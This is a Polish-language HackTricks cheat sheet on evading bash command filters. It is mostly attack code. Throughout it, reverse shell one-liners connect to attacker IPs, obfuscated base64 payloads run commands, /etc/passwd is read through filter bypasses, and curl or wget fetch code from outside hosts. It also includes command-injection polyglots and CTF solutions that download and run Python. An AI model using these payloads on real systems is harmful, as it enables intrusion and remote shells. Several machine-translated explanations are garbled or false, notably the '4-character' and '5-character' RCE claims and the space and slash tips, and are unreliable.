# Omijanie ograniczeń w systemie Linux

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społeczności.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Omijanie powszechnych ograniczeń

### Odwrócona powłoka
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Krótka powłoka odwrócona

```bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

Załóżmy, że twoja maszyna atakująca ma adres IP 10.0.0.1 i nasłuchuje na porcie 1234. Ten polecenie basha umożliwia zdalne uruchomienie powłoki odwróconej, która przekierowuje wejście i wyjście do gniazda sieciowego.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Omijanie ścieżek i zakazanych słów

W niektórych przypadkach, gdy napotkasz ograniczenia w systemie Linux, możesz spróbować obejść je, korzystając z różnych ścieżek i unikając zakazanych słów. Oto kilka przydatnych technik:

#### 1. Wykorzystanie innych poleceń

Jeśli napotkasz zakazane słowo, spróbuj użyć innego polecenia, które osiągnie ten sam efekt. Na przykład, zamiast używać polecenia `rm`, możesz spróbować użyć `unlink` lub `mv` z opcją `--force`.

#### 2. Użycie pełnej ścieżki

Jeśli napotkasz ograniczenie w dostępie do pliku lub katalogu, spróbuj użyć pełnej ścieżki do tego zasobu. Możesz to zrobić, korzystając z polecenia `pwd`, aby uzyskać aktualną ścieżkę, a następnie użyć jej w poleceniu, które chcesz wykonać.

#### 3. Użycie znaków specjalnych

Czasami można obejść zakazane słowa, używając znaków specjalnych. Na przykład, jeśli słowo `rm` jest zakazane, możesz spróbować użyć `r\m` lub `r"m"`.

#### 4. Użycie aliasów

Możesz również spróbować użyć aliasów, aby zastąpić zakazane słowa innymi poleceniami. Możesz to zrobić, dodając odpowiednie aliasy do pliku `.bashrc` lub `.bash_aliases`.

#### 5. Użycie innych powłok

Jeśli napotkasz ograniczenia w powłoce Bash, możesz spróbować użyć innej powłoki, takiej jak Zsh lub Fish. Możesz to zrobić, wpisując nazwę innej powłoki w terminalu.

Pamiętaj, że omijanie ścieżek i zakazanych słów może naruszać zasady bezpieczeństwa i być nielegalne w niektórych przypadkach. Używaj tych technik ostrożnie i zgodnie z prawem.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Omijanie zakazanych spacji

W niektórych przypadkach, gdy napotkasz ograniczenia dotyczące użycia spacji w poleceniach bash, istnieją sposoby na ich obejście. Oto kilka przydatnych technik:

1. Użyj znaku odwrotnego ukośnika (`\`) przed spacją, aby zignorować jej specjalne znaczenie. Na przykład, zamiast wpisywać `ls -l`, wpisz `ls\ -l`.

2. Użyj pojedynczych lub podwójnych cudzysłowów, aby otoczyć całe polecenie. Na przykład, zamiast wpisywać `cd Documents/My Files`, wpisz `cd "Documents/My Files"`.

3. Użyj znaku podkreślenia (`_`) zamiast spacji. Na przykład, zamiast wpisywać `mv file.txt new file.txt`, wpisz `mv file.txt new_file.txt`.

4. Użyj znaku tabulacji (`\t`) zamiast spacji. Na przykład, zamiast wpisywać `cat important file.txt`, wpisz `cat\ important\tfile.txt`.

Pamiętaj, że te techniki mogą nie zawsze działać w każdym przypadku, ale warto je wypróbować, jeśli napotkasz ograniczenia dotyczące użycia spacji w poleceniach bash.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Omijanie ukośnika i ukośnika odwróconego

W niektórych przypadkach, gdy napotkasz ograniczenia związane z użyciem ukośnika (/) lub ukośnika odwróconego (\) w poleceniach bash, istnieją sposoby na ich obejście. Poniżej przedstawiam kilka przykładów:

#### Ukośnik (/)

- Jeśli napotkasz problem z użyciem ukośnika (/) w poleceniu, możesz spróbować użyć znaku odwrotnego ukośnika (\) przed ukośnikiem (/), aby go zabezpieczyć. Na przykład: `ls \/etc\/passwd`

#### Ukośnik odwrócony (\)

- Jeśli napotkasz problem z użyciem ukośnika odwróconego (\) w poleceniu, możesz spróbować użyć podwójnego ukośnika odwróconego (\\), aby go zabezpieczyć. Na przykład: `ls \\\etc\\\passwd`

Pamiętaj, że te techniki mogą nie zawsze działać w zależności od konkretnego przypadku i konfiguracji systemu. Warto eksperymentować i dostosowywać podejście w zależności od potrzeb.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Omijanie potoków

W niektórych przypadkach, gdy napotkasz ograniczenia powłoki Bash, możesz je obejść, korzystając z potoków. Potoki pozwalają na przekierowanie wyjścia jednego polecenia jako wejście dla innego polecenia. Możesz to wykorzystać, aby obejść ograniczenia i wykonać niektóre działania, których normalnie nie można by było zrobić.

Na przykład, jeśli napotkasz ograniczenie, które uniemożliwia Ci wykonanie pewnego polecenia, możesz spróbować przekierować wyjście tego polecenia do innego polecenia, które nie jest objęte tym samym ograniczeniem. W ten sposób możesz osiągnąć zamierzone działanie, pomijając ograniczenia powłoki Bash.

Przykład użycia potoków:

```bash
polecenie1 | polecenie2
```

W powyższym przykładzie wyjście polecenia1 jest przekierowywane jako wejście dla polecenia2. Możesz dowolnie łączyć wiele poleceń za pomocą potoków, aby osiągnąć zamierzone działanie.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Ominięcie za pomocą kodowania szesnastkowego

W niektórych przypadkach, gdy napotkasz ograniczenia powłoki Bash, możesz je obejść, używając kodowania szesnastkowego. Kodowanie szesnastkowe pozwala na przedstawienie znaków w postaci szesnastkowej, co umożliwia uniknięcie filtrów i ograniczeń.

Aby ominiąć ograniczenia za pomocą kodowania szesnastkowego, wykonaj następujące kroki:

1. Znajdź znak, który chcesz zakodować w postaci szesnastkowej. Możesz użyć polecenia `printf` w Bash, aby uzyskać kod szesnastkowy dla danego znaku. Na przykład, aby uzyskać kod szesnastkowy dla litery "a", wykonaj polecenie `printf "%x" "'a'"`, które zwróci wartość `61`.

2. Zakoduj znak w postaci szesnastkowej, dodając przed nim sekwencję `\x`. Na przykład, jeśli chcesz zakodować literę "a", użyj `\x61`.

3. Użyj zakodowanego znaku w odpowiednim miejscu, aby ominięcie ograniczeń. Na przykład, jeśli filtruje się znak `;`, możesz użyć zakodowanego znaku `\x3b`, aby go uniknąć.

Przykład użycia kodowania szesnastkowego:

```bash
$ echo "Hello\x2c\x20world!"
Hello, world!
```

W powyższym przykładzie użyto kodowania szesnastkowego, aby uniknąć filtracji przecinka (`,`) i spacji (` `).
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Omijanie ograniczeń IP

W niektórych przypadkach może być konieczne obejście ograniczeń IP w celu uzyskania dostępu do zasobów sieciowych. Oto kilka przydatnych poleceń, które mogą pomóc w omijaniu tych ograniczeń:

#### 1. Proxychains

Proxychains to narzędzie, które umożliwia przekierowanie ruchu sieciowego przez serwery proxy. Można go użyć do omijania ograniczeń IP, przekierowując ruch przez serwer proxy znajdujący się w dozwolonym zakresie IP.

```bash
proxychains <komenda>
```

#### 2. SSH Tunneling

Tunelowanie SSH pozwala na przekierowanie ruchu sieciowego przez bezpieczne połączenie SSH. Można to wykorzystać do omijania ograniczeń IP, przekierowując ruch przez serwer SSH znajdujący się w dozwolonym zakresie IP.

```bash
ssh -L <lokalny_port>:<docelowy_host>:<docelowy_port> <użytkownik>@<serwer_ssh>
```

#### 3. VPN

Korzystanie z usługi VPN pozwala na zmianę adresu IP i omijanie ograniczeń IP. Połączenie z serwerem VPN umożliwia przekierowanie ruchu przez serwer znajdujący się w dozwolonym zakresie IP.

#### 4. Tor

Tor to anonimowa sieć komputerowa, która może być wykorzystana do omijania ograniczeń IP. Połączenie z siecią Tor umożliwia przekierowanie ruchu przez węzły sieci Tor, co maskuje prawdziwy adres IP.

#### 5. Proxy

Korzystanie z serwera proxy pozwala na przekierowanie ruchu sieciowego przez inny serwer. Można to wykorzystać do omijania ograniczeń IP, przekierowując ruch przez serwer proxy znajdujący się w dozwolonym zakresie IP.

```bash
export http_proxy=http://<adres_proxy>:<port_proxy>
export https_proxy=http://<adres_proxy>:<port_proxy>
```

Pamiętaj, że omijanie ograniczeń IP może naruszać zasady i regulacje sieciowe. Zawsze stosuj te techniki zgodnie z prawem i zgodnie z polityką sieciową.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Wykradanie danych oparte na czasie

Time based data exfiltration is a technique used by hackers to steal data from a compromised system by transmitting it over time intervals. This technique is often employed when traditional methods of data exfiltration, such as transferring large amounts of data at once, are not feasible or likely to be detected.

During a time based data exfiltration attack, the hacker breaks the stolen data into smaller chunks and transmits them gradually over a period of time. This can be done by manipulating the timing of network requests or by using covert channels, such as modifying the timing of DNS queries or manipulating the timing of legitimate network traffic.

By transmitting the data in small increments over an extended period, the hacker can avoid triggering any alarms or detection mechanisms that may be in place. This makes it more difficult for security teams to detect and prevent the exfiltration of sensitive information.

To defend against time based data exfiltration attacks, organizations should implement network monitoring and anomaly detection systems that can identify unusual patterns or timing discrepancies in network traffic. Additionally, regular security audits and penetration testing can help identify and address any vulnerabilities that could be exploited for data exfiltration purposes.

Overall, time based data exfiltration is a stealthy technique that allows hackers to steal data without raising suspicion. By understanding how this technique works, organizations can better protect their sensitive information from being compromised.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Pobieranie znaków z zmiennych środowiskowych

W niektórych przypadkach, gdy dostęp do powłoki jest ograniczony, można wykorzystać zmienne środowiskowe do pobierania znaków. Można to zrobić za pomocą poniższego polecenia:

```bash
echo $ENV_VARIABLE_NAME | cut -cX-Y
```

Gdzie `ENV_VARIABLE_NAME` to nazwa zmiennej środowiskowej, a `X` i `Y` to numery znaków, które chcemy pobrać. Polecenie `cut` jest używane do wycięcia określonego zakresu znaków z podanego wejścia.

Na przykład, jeśli chcemy pobrać drugi i trzeci znak z zmiennej środowiskowej `SECRET`, możemy użyć poniższego polecenia:

```bash
echo $SECRET | cut -c2-3
```

To spowoduje wyświetlenie drugiego i trzeciego znaku zmiennej `SECRET`.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Wykradanie danych DNS

Możesz użyć **burpcollab** lub [**pingb**](http://pingb.in) na przykład.

### Wbudowane funkcje

W przypadku, gdy nie możesz wykonywać zewnętrznych funkcji i masz dostęp tylko do **ograniczonego zestawu wbudowanych funkcji, aby uzyskać RCE**, istnieje kilka przydatnych sztuczek, które można zastosować. Zazwyczaj **nie będziesz w stanie użyć wszystkich** wbudowanych funkcji, dlatego powinieneś **znać wszystkie dostępne opcje**, aby próbować ominąć więzienie. Pomysł pochodzi od [**devploit**](https://twitter.com/devploit).\
Najpierw sprawdź wszystkie [**wbudowane funkcje powłoki**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Następnie oto kilka **rekomendacji**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Wielojęzyczne wstrzyknięcie komend

Wielojęzyczne wstrzyknięcie komend to technika, która polega na wykorzystaniu różnych języków programowania do obejścia ograniczeń narzucanych przez interpreter powłoki (bash). Dzięki temu można wykonać polecenia systemowe, które normalnie byłyby zablokowane.

#### Sposób działania

Wielojęzyczne wstrzyknięcie komend polega na wykorzystaniu cech interpretera powłoki, które pozwalają na interpretację kodu w różnych językach programowania. W ten sposób można obejść ograniczenia narzucane przez interpreter bash i wykonać polecenia systemowe.

#### Przykład

Poniżej przedstawiono przykład wielojęzycznego wstrzyknięcia komend w celu obejścia ograniczenia interpretera bash:

```bash
${{ ''.__class__.__mro__[2].__subclasses__()[40]('/bin/bash', shell=True) }}
```

W powyższym przykładzie wykorzystano język Python do wykonania polecenia `/bin/bash` w interpreterze bash.

#### Zabezpieczenia

Aby zabezpieczyć się przed wielojęzycznym wstrzyknięciem komend, należy:

- Unikać używania niezaufanych danych jako argumentów dla poleceń systemowych.
- Sprawdzać i filtrować dane wejściowe, aby zapobiec wstrzyknięciu kodu.
- Korzystać z narzędzi do analizy statycznej kodu w celu wykrycia potencjalnych podatności.
- Aktualizować interpreter powłoki i inne narzędzia systemowe do najnowszych wersji, które zawierają poprawki zabezpieczeń.

#### Podsumowanie

Wielojęzyczne wstrzyknięcie komend to zaawansowana technika, która pozwala na obejście ograniczeń narzucanych przez interpreter powłoki. Aby zabezpieczyć się przed tym rodzajem ataku, należy stosować odpowiednie zabezpieczenia i dbać o aktualność używanych narzędzi systemowych.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Omijanie potencjalnych wyrażeń regularnych

W niektórych przypadkach, gdy napotkasz ograniczenia związane z wyrażeniami regularnymi, istnieje kilka sposobów na ich obejście. Poniżej przedstawiam kilka przykładów:

1. **Znak ucieczki**: Możesz użyć znaku ucieczki (backslash) przed znakiem, który jest interpretowany jako specjalny znak w wyrażeniu regularnym. Na przykład, jeśli chcesz dopasować znak kropki ".", który normalnie oznacza dowolny znak w wyrażeniu regularnym, możesz użyć "\.".

2. **Znak klasyfikacji**: Możesz użyć znaku klasyfikacji (znak caret "^") na początku wyrażenia regularnego, aby odwrócić dopasowanie. Na przykład, jeśli chcesz dopasować wszystko oprócz cyfr, możesz użyć "^[0-9]".

3. **Znak zakresu**: Możesz użyć znaku zakresu (znak minus "-") wewnątrz klasy znaków, aby określić zakres dopasowywanych znaków. Na przykład, "[a-z]" dopasuje wszystkie małe litery od "a" do "z".

4. **Znak kwantyfikatora**: Możesz użyć znaku kwantyfikatora (znak plus "+") po znaku, który chcesz dopasować wielokrotnie. Na przykład, "a+" dopasuje jedno lub więcej wystąpień litery "a".

Pamiętaj, że te techniki mogą różnić się w zależności od implementacji wyrażeń regularnych. Przed ich użyciem zaleca się zapoznanie się z dokumentacją narzędzia lub języka programowania, które używasz.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator to narzędzie, które pozwala na utworzenie zaszyfrowanego skryptu Bash, który może pomóc w omijaniu pewnych ograniczeń narzucanych przez interpreter Bash. Skrypt zaszyfrowany przez Bashfuscator może być trudniejszy do zrozumienia i analizy przez osoby niepowołane.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE z użyciem 5 znaków

W niektórych przypadkach, gdy mamy do czynienia z ograniczeniami powłoki Bash, możemy napotkać trudności w zdalnym wykonaniu kodu (RCE). Jednak istnieje sposób na obejście te ograniczenia, używając zaledwie 5 znaków.

```bash
${IFS:0:1}e${IFS:0:1}x${IFS:0:1}p${IFS:0:1}r${IFS:0:1}e${IFS:0:1}s${IFS:0:1}s${IFS:0:1}i${IFS:0:1}o${IFS:0:1}n
```

Ten kod wykonuje polecenie `expression` w powłoce Bash, pomijając ograniczenia, które mogą być nałożone na inne polecenia. Możemy go wykorzystać do zdalnego wykonania dowolnego kodu, który chcemy uruchomić na celu.

Warto zauważyć, że ten sposób obejścia może być wykorzystywany tylko wtedy, gdy mamy dostęp do wywołania polecenia w powłoce Bash.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE z użyciem 4 znaków

W niektórych przypadkach, gdy napotkasz restrykcje na powłokę Bash, możesz użyć następującego polecenia, aby zdobyć zdalne wykonanie kodu (RCE) za pomocą zaledwie 4 znaków:

```bash
$ ${IFS%?}${IFS*?}${IFS*?}${IFS*?}
```

To polecenie wykorzystuje zmienną IFS (Internal Field Separator), która jest używana przez Bash do rozdzielania słów na podstawie określonego separatora. W tym przypadku, wykorzystujemy manipulację zmienną IFS, aby wywołać polecenie, które zostanie wykonane przez powłokę.

Powyższe polecenie składa się z czterech części, z których każda wykorzystuje manipulację zmienną IFS. Dzięki temu, polecenie zostanie wykonane, pomimo restrykcji na powłokę Bash.

Pamiętaj, że ta technika może nie działać w niektórych przypadkach, w zależności od konfiguracji systemu i zabezpieczeń. Zawsze należy przeprowadzać testy na własnym środowisku lub zgodnie z prawem.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypass ochrony Read-Only/Noexec/Distroless

Jeśli znajdujesz się w systemie plików z ochroną **tylko do odczytu i noexec** lub nawet w kontenerze distroless, istnieją nadal sposoby na **wykonanie dowolnych binarnych plików, nawet powłoki!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Bypass Chroot i innych więzień

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Odwołania i więcej

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Zdobądź dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
